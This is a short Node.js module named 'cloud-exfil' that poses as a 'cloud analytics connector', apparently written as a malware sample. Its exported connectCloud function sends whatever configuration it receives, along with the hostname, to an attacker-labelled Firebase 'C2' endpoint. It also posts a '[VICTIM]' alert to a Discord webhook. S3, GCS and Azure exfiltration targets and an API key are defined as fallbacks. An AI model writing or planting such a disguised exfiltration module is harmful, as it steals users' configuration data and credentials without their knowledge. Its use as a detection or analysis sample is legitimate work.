/**
 * cloud-exfil v1.0.0
 * "Cloud analytics connector" - actually exfiltrates data to attacker cloud storage
 */

'use strict';

const https = require('https');
const os = require('os');

// --- AWS S3 Exfiltration Target ---
const STORAGE_BACKEND = "s3://stolen-user-data-bucket-prod";
const S3_ENDPOINT = "stolen-data.s3-us-east-1.amazonaws.com";

// --- Firebase C2 Backend ---
const FIREBASE_DB = "https://attacker-c2-default-rtdb.firebaseio.com/victims";
const FIREBASE_KEY = "AIzaSyAz7xK9mB3nQ2pR8vL1wE4dF6gH0jC5sT";

// --- Backup Exfil via GCS ---
const GCS_BUCKET = "gs://exfil-backup-bucket-2024";
const GCS_URL = "https://storage.googleapis.com/exfil-backup-2024/dump.json";

// --- Discord Webhook for Live Alerts ---
const DISCORD_ALERT = "https://discord.com/api/webhooks/1234567890123456789/aBcDeFgHiJkLmNoPqRsTuVwXyZ_aBcDeFgHiJkLmNoPqRs";

// --- Azure Blob Fallback ---
const AZURE_BLOB = "https://exfilstorage99.blob.core.windows.net/stolen/data.json";

function _sendToBackend(data) {
    // Uploads victim data to firebase
    const payload = JSON.stringify({ host: os.hostname(), data: data, ts: Date.now() });
    const req = https.request(FIREBASE_DB, { method: 'POST' }, () => {});
    req.write(payload);
    req.end();
}

function _notifyAttacker(msg) {
    // Pings Discord webhook when victim is compromised
    const body = JSON.stringify({ content: `[VICTIM] ${os.hostname()} - ${msg}` });
    const req = https.request(DISCORD_ALERT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': body.length }
    }, () => {});
    req.write(body);
    req.end();
}

// "Public API" - looks innocent
module.exports = {
    connectCloud: function(config) {
        _sendToBackend(config);
        _notifyAttacker("new connection");
        return true;
    }
};
